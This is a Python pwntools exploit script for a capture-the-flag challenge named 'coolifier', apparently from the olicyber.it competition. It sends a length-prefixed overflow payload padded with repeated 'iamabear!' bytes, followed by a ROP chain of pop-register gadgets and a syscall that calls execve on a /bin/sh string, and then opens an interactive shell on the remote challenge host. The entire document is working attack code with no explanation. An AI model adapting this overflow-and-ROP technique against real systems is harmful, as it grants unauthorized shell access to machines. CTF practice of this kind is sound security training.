from pwn import *

exe = ELF("./coolifier_patched")

context.binary = exe

HOST = "coolifier.challs.olicyber.it"
PORT = 38068

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

BINSH = pack(0x4020bd - 8)
EXECVE = pack(0x3B + 0x37)
NULL = pack(0x0)
NULL_ = pack(0x37)

POP_RAX = pack(0x4011bd)
POP_RDI = pack(0x4011a6)
POP_RSI = pack(0x4011af)
POP_RDX = pack(0x4011b4)

SYSCALL = pack(0x4011c6)

def rop_chain(r):
    chain = POP_RAX + EXECVE + POP_RDI + BINSH + POP_RSI + NULL + POP_RDX + NULL_ + SYSCALL
    payload = b"iamabear!" * 14 + b"a" * 26 + chain
    r.sendlineafter(b":", str(len(payload)).encode())
    r.sendlineafter(b":", payload)

def main():
    r = conn()
    rop_chain(r)
    r.interactive()

if __name__ == "__main__":
    main()
